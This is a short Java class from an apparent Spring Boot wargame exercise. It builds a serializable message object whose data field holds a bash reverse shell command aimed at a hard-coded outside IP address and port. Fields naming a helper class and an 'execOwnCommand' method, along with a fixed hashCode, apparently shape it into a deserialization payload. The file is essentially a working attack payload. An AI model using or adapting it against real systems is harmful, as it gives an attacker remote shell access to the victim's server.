package my.wargames.springboot;

import java.io.Serializable;

public class WargamesMsg implements Serializable {
    private static final long serialVersionUID = 1234567L;

    private String data = "bash -i >& /dev/tcp/128.199.135.239/8888 0>&1";

    private String className = "my.wargames.springboot.Helper";

    private String methodName = "execOwnCommand";

    public WargamesMsg() {
    }

    public void rekt() {
    }

    public int hashCode() {
        return 4919;
    }
}